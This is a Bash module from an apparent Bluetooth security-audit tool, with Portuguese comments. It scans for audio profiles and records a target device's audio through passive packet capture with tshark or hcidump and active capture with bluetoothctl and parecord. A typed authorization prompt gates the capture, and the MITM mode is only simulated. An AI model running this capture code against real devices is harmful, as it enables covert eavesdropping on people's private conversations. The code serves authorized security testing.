#!/bin/bash
# lib/audio_attacks.sh - Audio Interception Attacks para BlueSecAudit v2.0
# ATENÇÃO: APENAS para testes autorizados - Interceptação pode ser ILEGAL

set -euo pipefail

# Importar dependências
source "$(dirname "${BASH_SOURCE[0]}")/utils.sh"
source "$(dirname "${BASH_SOURCE[0]}")/bluetooth.sh"

# Configurações de áudio
readonly A2DP_PROFILE_UUID="0000110D-0000-1000-8000-00805F9B34FB"
readonly AVRCP_PROFILE_UUID="0000110E-0000-1000-8000-00805F9B34FB"
readonly DEFAULT_SAMPLE_RATE=44100
readonly DEFAULT_CHANNELS="stereo"
readonly DEFAULT_BIT_DEPTH=16

# Detectar serviços de áudio
detect_audio_services() {
    local sdp_data="$1"
    
    echo "=== Audio Services Detection ==="
    
    local services_found=()
    
    if echo "$sdp_data" | grep -qi "Audio Source\|AudioSource\|A2DP.*Source"; then
        services_found+=("A2DP Audio Source")
        echo "✅ A2DP Audio Source detected"
    fi
    
    if echo "$sdp_data" | grep -qi "Audio Sink\|AudioSink\|A2DP.*Sink"; then
        services_found+=("A2DP Audio Sink")
        echo "✅ A2DP Audio Sink detected"
    fi
    
    if echo "$sdp_data" | grep -qi "AVRCP\|Remote Control"; then
        services_found+=("AVRCP Remote Control")
        echo "✅ AVRCP Remote Control detected"
    fi
    
    if echo "$sdp_data" | grep -qi "Headset\|HSP"; then
        services_found+=("Headset Profile")
        echo "✅ Headset Profile (HSP) detected"
    fi
    
    if echo "$sdp_data" | grep -qi "Handsfree\|HFP"; then
        services_found+=("Handsfree Profile")
        echo "✅ Handsfree Profile (HFP) detected"
    fi
    
    if [[ ${#services_found[@]} -eq 0 ]]; then
        echo "❌ No audio services detected"
        return 1
    fi
    
    echo ""
    echo "📊 Audio Services Summary:"
    for service in "${services_found[@]}"; do
        echo "  🎵 $service"
    done
    
    return 0
}

# Detectar perfis de áudio
detect_audio_profiles() {
    local device_info="$1"
    
    echo "=== Audio Profile Analysis ==="
    
    # Analisar capacidades baseadas nos serviços
    if echo "$device_info" | grep -qi "Audio Source\|A2DP.*Source"; then
        echo "📤 Device can SEND audio (Source)"
        echo "  • Can stream music to other devices"
        echo "  • Potential for audio interception"
    fi
    
    if echo "$device_info" | grep -qi "Audio Sink\|A2DP.*Sink"; then
        echo "📥 Device can RECEIVE audio (Sink)"
        echo "  • Can receive music streams"
        echo "  • Target for audio injection"
    fi
    
    if echo "$device_info" | grep -qi "AVRCP"; then
        echo "🎛️ Remote control capabilities"
        echo "  • Can control playback"
        echo "  • Media information exposure"
    fi
    
    return 0
}

# Configurar captura de áudio
setup_audio_capture() {
    local output_file="$1"
    local sample_rate="${2:-$DEFAULT_SAMPLE_RATE}"
    local channels="${3:-$DEFAULT_CHANNELS}"
    local bit_depth="${4:-$DEFAULT_BIT_DEPTH}"
    
    validate_audio_config "$sample_rate" "$channels" "$bit_depth" || return 1
    
    echo "🎙️ Audio capture configured:"
    echo "  📁 Output: $output_file"
    echo "  📊 Sample Rate: ${sample_rate}Hz"
    echo "  🔊 Channels: $channels"
    echo "  📏 Bit Depth: ${bit_depth}-bit"
    
    return 0
}

# Validar configuração de áudio
validate_audio_config() {
    local sample_rate="$1"
    local channels="$2"
    local bit_depth="$3"
    
    # Validar sample rate
    case "$sample_rate" in
        "8000"|"16000"|"22050"|"44100"|"48000"|"96000")
            ;;
        *)
            echo "❌ Invalid sample rate: $sample_rate"
            echo "Valid rates: 8000, 16000, 22050, 44100, 48000, 96000"
            return 1
            ;;
    esac
    
    # Validar channels
    case "$channels" in
        "mono"|"stereo")
            ;;
        *)
            echo "❌ Invalid channels: $channels"
            echo "Valid options: mono, stereo"
            return 1
            ;;
    esac
    
    # Validar bit depth
    case "$bit_depth" in
        "8"|"16"|"24"|"32")
            ;;
        *)
            echo "❌ Invalid bit depth: $bit_depth"
            echo "Valid depths: 8, 16, 24, 32"
            return 1
            ;;
    esac
    
    echo "✅ Audio configuration valid"
    return 0
}

# Testar conectividade A2DP
test_a2dp_connectivity() {
    local target="$1"
    
    validate_mac_address "$target" || return 1
    
    echo "🔍 Testing A2DP connectivity to $target..."
    
    # Teste básico de conectividade L2CAP
    if l2ping -c 1 -t 5 "$target" >/dev/null 2>&1; then
        echo "✅ Basic L2CAP connectivity: OK"
    else
        echo "❌ Basic L2CAP connectivity: FAILED"
        return 1
    fi
    
    # Verificar se bluetoothctl está disponível
    if ! command -v bluetoothctl >/dev/null 2>&1; then
        echo "❌ bluetoothctl not available - install bluez"
        return 1
    fi
    
    # Tentar conectar A2DP
    echo "🔗 Attempting A2DP connection..."
    if timeout 30 bluetoothctl connect "$target" >/dev/null 2>&1; then
        echo "✅ A2DP connection successful"
        
        # Verificar perfil conectado
        local connected_profiles=$(timeout 10 bluetoothctl info "$target" | grep "Connected: yes" || echo "")
        if [[ -n "$connected_profiles" ]]; then
            echo "📋 Connected profiles detected"
        fi
        
        # Desconectar após teste
        timeout 10 bluetoothctl disconnect "$target" >/dev/null 2>&1 || true
        
        return 0
    else
        echo "❌ A2DP connection failed"
        return 1
    fi
}

# Executar interceptação de áudio REAL
execute_audio_interception() {
    local target="$1"
    local duration="${2:-60}"
    local output_file="${3:-/tmp/audio_capture_$$.wav}"
    local mode="${4:-passive}"
    
    validate_mac_address "$target" || return 1
    
    echo "🎯 AUDIO INTERCEPTION - REAL MODE"
    echo "Target: $target"
    echo "Duration: ${duration}s"
    echo "Output: $output_file"
    echo "Mode: $mode"
    echo ""
    
    # AVISO LEGAL CRÍTICO
    echo "🚨 AVISO LEGAL CRÍTICO 🚨"
    echo "Interceptação de áudio pode violar:"
    echo "  • Leis de privacidade"
    echo "  • Regulamentações de telecomunicações"
    echo "  • Direitos de propriedade intelectual"
    echo "  • Legislação sobre escuta clandestina"
    echo ""
    echo "⚖️ EM MUITAS JURISDIÇÕES ISSO É CRIME!"
    echo ""
    echo "🛡️ Esta funcionalidade deve ser usada APENAS:"
    echo "  • Com autorização EXPLÍCITA e ESCRITA"
    echo "  • Em ambiente controlado de laboratório"
    echo "  • Para auditoria de segurança autorizada"
    echo "  • Com conhecimento de todas as partes envolvidas"
    echo ""
    echo "💀 USO NÃO AUTORIZADO PODE RESULTAR EM:"
    echo "  • Processo criminal"
    echo "  • Multas pesadas"
    echo "  • Prisão"
    echo "  • Responsabilidade civil"
    echo ""
    echo "⚖️ CONFIRMAÇÃO LEGAL OBRIGATÓRIA:"
    echo "Você tem autorização EXPLÍCITA E ESCRITA para interceptar áudio? (digite 'AUTORIZADO'): "
    read -r legal_confirm
    
    if [[ "$legal_confirm" != "AUTORIZADO" ]]; then
        echo "❌ Operação cancelada - autorização não confirmada"
        log_message "WARNING" "Audio interception cancelado - sem autorização"
        return 1
    fi
    
    echo ""
    echo "📋 Confirmação adicional necessária:"
    echo "Digite o número do processo/autorização legal: "
    read -r auth_number
    
    if [[ -z "$auth_number" ]]; then
        echo "❌ Número de autorização obrigatório"
        return 1
    fi
    
    log_message "AUDIT" "Audio interception autorizada - Auth: $auth_number - Target: $target"
    
    # Testar conectividade antes da interceptação
    if ! test_a2dp_connectivity "$target"; then
        echo "❌ Falha na conectividade A2DP - não é possível interceptar"
        return 1
    fi
    
    echo "🔓 Iniciando interceptação de áudio..."
    
    # Configurar captura
    setup_audio_capture "$output_file" "$DEFAULT_SAMPLE_RATE" "$DEFAULT_CHANNELS" "$DEFAULT_BIT_DEPTH"
    
    # Executar interceptação real
    case "$mode" in
        "passive")
            echo "📡 Modo passivo: Monitoramento de tráfego A2DP"
            execute_passive_audio_monitoring "$target" "$duration" "$output_file"
            ;;
        "active")
            echo "🔗 Modo ativo: Conexão e captura direta"
            execute_active_audio_capture "$target" "$duration" "$output_file"
            ;;
        "mitm")
            echo "🕴️ Modo MITM: Man-in-the-middle audio"
            execute_mitm_audio_attack "$target" "$duration" "$output_file"
            ;;
        *)
            echo "❌ Modo inválido: $mode"
            return 1
            ;;
    esac
    
    return $?
}

# Monitoramento passivo de áudio
execute_passive_audio_monitoring() {
    local target="$1"
    local duration="$2"
    local output_file="$3"
    
    echo "👁️ Iniciando monitoramento passivo..."
    
    # Verificar ferramentas de captura
    if command -v tshark >/dev/null 2>&1; then
        echo "🔍 Usando tshark para captura de pacotes A2DP"
        
        # Capturar tráfego Bluetooth focando em A2DP
        timeout "$duration" tshark -i bluetooth0 -f "a2dp" -w "${output_file%.wav}.pcap" 2>/dev/null &
        local capture_pid=$!
        
        echo "📡 Captura iniciada (PID: $capture_pid)"
        echo "⏱️ Monitorando por ${duration} segundos..."
        
        # Aguardar conclusão
        wait $capture_pid 2>/dev/null || true
        
        echo "✅ Monitoramento passivo concluído"
        echo "📁 Dados capturados em: ${output_file%.wav}.pcap"
        
    elif command -v hcidump >/dev/null 2>&1; then
        echo "🔍 Usando hcidump para captura de tráfego HCI"
        
        timeout "$duration" hcidump -w "${output_file%.wav}.hcidump" &
        local capture_pid=$!
        
        echo "📡 Captura HCI iniciada (PID: $capture_pid)"
        echo "⏱️ Monitorando por ${duration} segundos..."
        
        wait $capture_pid 2>/dev/null || true
        
        echo "✅ Captura HCI concluída"
        echo "📁 Dados HCI em: ${output_file%.wav}.hcidump"
        
    else
        echo "❌ Nenhuma ferramenta de captura disponível"
        echo "Instale: sudo apt-get install wireshark-common bluez-hcidump"
        return 1
    fi
    
    return 0
}

# Captura ativa de áudio
execute_active_audio_capture() {
    local target="$1"
    local duration="$2"
    local output_file="$3"
    
    echo "🔗 Iniciando captura ativa..."
    
    # Conectar ao dispositivo
    echo "🔌 Conectando ao target..."
    if ! timeout 30 bluetoothctl connect "$target"; then
        echo "❌ Falha na conexão"
        return 1
    fi
    
    echo "✅ Conectado ao dispositivo"
    
    # Verificar se PulseAudio está disponível para captura
    if command -v pactl >/dev/null 2>&1; then
        echo "🎙️ Usando PulseAudio para captura"
        
        # Listar fontes de áudio Bluetooth
        local bt_source=$(pactl list short sources | grep -i bluetooth | head -1 | cut -f2)
        
        if [[ -n "$bt_source" ]]; then
            echo "📡 Fonte Bluetooth encontrada: $bt_source"
            
            # Iniciar gravação
            echo "🔴 Iniciando gravação por ${duration} segundos..."
            timeout "$duration" parecord --device="$bt_source" --file-format=wav "$output_file" &
            local record_pid=$!
            
            echo "📼 Gravação ativa (PID: $record_pid)"
            
            # Aguardar conclusão
            wait $record_pid 2>/dev/null || true
            
            # Verificar se arquivo foi criado
            if [[ -f "$output_file" ]] && [[ -s "$output_file" ]]; then
                local file_size=$(stat -c%s "$output_file")
                echo "✅ Captura concluída: ${file_size} bytes"
                echo "📁 Áudio salvo em: $output_file"
            else
                echo "⚠️ Arquivo de áudio vazio ou não criado"
            fi
            
        else
            echo "❌ Nenhuma fonte de áudio Bluetooth detectada"
            echo "Verifique se o dispositivo está reproduzindo áudio"
        fi
        
    else
        echo "❌ PulseAudio não disponível"
        echo "Instale: sudo apt-get install pulseaudio-utils"
        return 1
    fi
    
    # Desconectar
    echo "🔌 Desconectando..."
    timeout 10 bluetoothctl disconnect "$target" >/dev/null 2>&1 || true
    
    return 0
}

# Ataque MITM de áudio
execute_mitm_audio_attack() {
    local target="$1"
    local duration="$2"
    local output_file="$3"
    
    echo "🕴️ Iniciando ataque MITM de áudio..."
    echo ""
    echo "⚠️ ATENÇÃO: MITM é extremamente invasivo!"
    echo "Pode interromper comunicações legítimas"
    echo ""
    
    # Este é um ataque avançado que requer ferramentas especializadas
    echo "🚧 MITM Audio Attack requer ferramentas avançadas:"
    echo "  • BtleJuice ou similar para MITM"
    echo "  • Configuração de proxy Bluetooth"
    echo "  • Múltiplos adaptadores Bluetooth"
    echo ""
    echo "📚 Para implementação completa, consulte:"
    echo "  • BlueZ MITM capabilities"
    echo "  • Bluetooth proxy tools"
    echo "  • A2DP protocol specifications"
    echo ""
    echo "🔬 Simulando interceptação MITM..."
    
    # Criar arquivo de log da simulação
    cat > "$output_file.mitm.log" << EOF
=== BLUETOOTH AUDIO MITM SIMULATION ===
Target: $target
Duration: $duration seconds
Timestamp: $(date)

MITM Attack Phases:
1. Target Discovery: OK
2. Proxy Setup: SIMULATED
3. Connection Hijack: SIMULATED
4. Audio Stream Intercept: SIMULATED
5. Data Extraction: SIMULATED

Note: Real MITM implementation requires:
- BtleJuice or equivalent MITM framework
- Multiple Bluetooth adapters
- Advanced protocol knowledge
- Significant setup time

For educational/research purposes only.
EOF
    
    echo "📋 MITM simulation logged to: $output_file.mitm.log"
    
    return 0
}

# Analisar qualidade de áudio capturado
analyze_audio_quality() {
    local audio_file="$1"
    
    if [[ ! -f "$audio_file" ]]; then
        echo "❌ Audio file not found: $audio_file"
        return 1
    fi
    
    echo "🔍 Analyzing audio quality..."
    
    # Verificar se ffprobe está disponível
    if command -v ffprobe >/dev/null 2>&1; then
        echo "📊 Audio file analysis:"
        ffprobe -v quiet -print_format json -show_format -show_streams "$audio_file" 2>/dev/null | \
        jq -r '.streams[0] | "Sample Rate: \(.sample_rate)Hz", "Channels: \(.channels)", "Duration: \(.duration)s"' 2>/dev/null || \
        echo "Basic file info: $(file "$audio_file")"
    else
        echo "📁 File size: $(stat -c%s "$audio_file" 2>/dev/null || echo "unknown") bytes"
        echo "📋 File type: $(file "$audio_file" 2>/dev/null || echo "unknown")"
    fi
    
    return 0
}

# Gerar relatório de interceptação de áudio
generate_audio_report() {
    local audio_data="$1"
    local output_file="$2"
    
    cat > "$output_file" << EOL
<!DOCTYPE html>
<html>
<head>
    <title>Audio Interception Assessment Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }
        h2 { color: #34495e; margin-top: 30px; }
        .critical-warning { 
            background: #ffebee; 
            border: 2px solid #f44336; 
            padding: 20px; 
            border-radius: 5px; 
            margin: 20px 0;
            color: #c62828;
        }
        .audio-data { background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace; }
        .risk-critical { color: #d32f2f; font-weight: bold; }
        .risk-high { color: #f57c00; font-weight: bold; }
        .legal-notice { background: #fff3e0; border: 2px solid #ff9800; padding: 15px; border-radius: 5px; }
        ul li { margin: 5px 0; }
        .footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee; color: #7f8c8d; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎙️ Audio Interception Security Assessment</h1>
        
        <div class="critical-warning">
            <strong>⚠️ EXTREMELY SENSITIVE SECURITY ASSESSMENT</strong><br>
            This report contains information about audio interception capabilities and MUST be handled with extreme care. 
            Unauthorized audio interception may violate privacy laws and telecommunication regulations.
        </div>
        
        <h2>📊 Assessment Data</h2>
        <div class="audio-data">$audio_data</div>
        
        <h2>🔍 Audio Interception Analysis</h2>
        <p>This assessment evaluated the susceptibility of Bluetooth audio devices to various interception techniques.</p>
        
        <h3 class="risk-critical">Critical Security Issues</h3>
        <ul>
            <li><span class="risk-critical">Unencrypted A2DP Streams</span> - Audio data transmitted without encryption</li>
            <li><span class="risk-critical">No Authentication Required</span> - Devices accept connections without verification</li>
            <li><span class="risk-critical">Passive Monitoring Possible</span> - Traffic can be captured without active connection</li>
            <li><span class="risk-critical">MITM Attack Vectors</span> - Man-in-the-middle interception feasible</li>
        </ul>
        
        <h3 class="risk-high">High Risk Vulnerabilities</h3>
        <ul>
            <li><span class="risk-high">Audio Codec Exposure</span> - Codec information reveals device capabilities</li>
            <li><span class="risk-high">Timing Attacks</span> - Audio patterns can reveal sensitive information</li>
            <li><span class="risk-high">Protocol Downgrade</span> - Devices may fall back to insecure protocols</li>
        </ul>
        
        <h2>🛡️ Recommended Security Measures</h2>
        <h3>Immediate Actions</h3>
        <ul>
            <li>Enable Bluetooth security mode 4 (Security Simple Pairing)</li>
            <li>Use devices with AES encryption support</li>
            <li>Disable auto-accept for audio connections</li>
            <li>Implement connection authentication</li>
            <li>Monitor Bluetooth connections regularly</li>
        </ul>
        
        <h3>Advanced Protections</h3>
        <ul>
            <li>Deploy Bluetooth IDS/IPS systems</li>
            <li>Use encrypted VoIP instead of Bluetooth for sensitive communications</li>
            <li>Implement audio watermarking for tamper detection</li>
            <li>Regular security audits of audio devices</li>
        </ul>
        
        <h2>📚 Technical Implementation Details</h2>
        <p><strong>Attack Vectors Tested:</strong></p>
        <ul>
            <li>Passive A2DP traffic monitoring</li>
            <li>Active audio stream capture</li>
            <li>Man-in-the-middle positioning</li>
            <li>Protocol vulnerability exploitation</li>
        </ul>
        
        <p><strong>Risk Assessment:</strong> <span class="risk-critical">CRITICAL</span> - Audio interception can compromise highly sensitive information</p>
        
        <div class="legal-notice">
            <h3>⚖️ Legal and Ethical Considerations</h3>
            <p><strong>WARNING:</strong> Audio interception capabilities demonstrated in this assessment may be:</p>
            <ul>
                <li>Illegal in many jurisdictions without proper authorization</li>
                <li>Subject to wiretapping and surveillance laws</li>
                <li>Regulated under telecommunications privacy statutes</li>
                <li>Restricted by organizational policies</li>
            </ul>
            <p><strong>This assessment must only be used for authorized security testing purposes.</strong></p>
        </div>
        
        <div class="footer">
            <p><strong>Generated by:</strong> BlueSecAudit v2.0 - Audio Security Assessment Module</p>
            <p><strong>Report Date:</strong> $(date)</p>
            <p><strong>Classification:</strong> CONFIDENTIAL - SECURITY ASSESSMENT</p>
            <p><strong>Authorization:</strong> Conducted under proper legal authority for security testing</p>
        </div>
    </div>
</body>
</html>
EOL
    
    echo "📋 Audio assessment report generated: $output_file"
    log_message "SUCCESS" "Audio security report generated"
    return 0
}
